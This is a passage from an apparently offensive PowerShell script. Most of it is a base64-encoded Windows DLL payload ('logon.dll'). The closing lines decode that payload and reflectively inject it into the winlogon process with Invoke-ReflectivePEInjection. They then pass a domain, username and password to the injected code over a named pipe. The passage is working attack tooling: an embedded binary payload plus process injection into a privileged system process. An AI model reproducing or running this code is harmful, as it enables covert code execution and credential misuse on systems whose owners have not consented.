/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRRUFBQUVBVjAxQEhAWgAABQE/PzY/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRRUFBQUVBVjAxQFA2QUFFQVYwMUBBRUFWMDFAQFpAWgAATVNWQ1AxMTAuZGxsAAD7BW1lbW1vdmUA+QNfcHVyZWNhbGwAcwA/PzNAWUFYUEVBWEBaAHEAPz8yQFlBUEVBWF9LQFoAAE1TVkNSMTEwLmRsbAAARgNfbG9jawCrBF91bmxvY2sABgJfY2FsbG9jX2NydACdAV9fZGxsb25leGl0AGABX19DX3NwZWNpZmljX2hhbmRsZXIAAO0DX29uZXhpdABhAV9fQ3BwWGNwdEZpbHRlcgDwAV9hbXNnX2V4aXQAALMFZnJlZQAAVwNfbWFsbG9jX2NydADWAl9pbml0dGVybQDXAl9pbml0dGVybV9lAJsBX19jcnRfZGVidWdnZXJfaG9vawCaAV9fY3J0VW5oYW5kbGVkRXhjZXB0aW9uAJkBX19jcnRUZXJtaW5hdGVQcm9jZXNzAIEBX19jcnRDYXB0dXJlUHJldmlvdXNDb250ZXh0ADkBP3Rlcm1pbmF0ZUBAWUFYWFoAIQE/X3R5cGVfaW5mb19kdG9yX2ludGVybmFsX21ldGhvZEB0eXBlX2luZm9AQFFFQUFYWFoAfgFfX2NsZWFuX3R5cGVfaW5mb19uYW1lc19pbnRlcm5hbAAAQAFFbmNvZGVQb2ludGVyABgBRGVjb2RlUG9pbnRlcgCGA0lzRGVidWdnZXJQcmVzZW50AIsDSXNQcm9jZXNzb3JGZWF0dXJlUHJlc2VudAA/BFF1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyACoCR2V0Q3VycmVudFByb2Nlc3NJZAAuAkdldEN1cnJlbnRUaHJlYWRJZAAA+wJHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQBKAV9DeHhUaHJvd0V4Y2VwdGlvbgAAZgFfX0N4eEZyYW1lSGFuZGxlcjMAAPkFbWVtY3B5AAAAAAAAAADrzoVSAAAAADJHAAABAAAAAQAAAAEAAAAoRwAALEcAADBHAACQFgAAPEcAAAAAbG9nb24uZGxsAFZvaWRGdW5jAAAAAAAAAAAAAAAAAAAAAAA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"
        [Byte[]]$Logon32Bit = [Convert]::FromBase64String($Logon32Bit_Base64)
        [Byte[]]$Logon64Bit = [Convert]::FromBase64String($Logon64Bit_Base64)
        Invoke-ReflectivePEInjection -Bytes32 $Logon32Bit -Bytes64 $Logon64Bit -ProcId $WinLogonProcessId


        #Send domain, username, and password over the named pipe
        [Byte[]]$DomainBytes = [System.Text.UnicodeEncoding]::Unicode.GetBytes($DomainName)
        [Byte[]]$UsernameBytes = [System.Text.UnicodeEncoding]::Unicode.GetBytes($UserName)
        [Byte[]]$PasswordBytes = [System.Text.UnicodeEncoding]::Unicode.GetBytes($Password)

        $Pipe.WaitForConnection()

        $Pipe.Write($DomainBytes, 0, $DomainBytes.Count)
        $Pipe.WaitForPipeDrain()
        $Pipe.Write($UsernameBytes, 0, $UsernameBytes.Count)
        $Pipe.WaitForPipeDrain()
        $Pipe.Write($PasswordBytes, 0, $PasswordBytes.Count)
        $Pipe.WaitForPipeDrain()
    }
    finally
    {
        $Pipe.Dispose()
    }
}
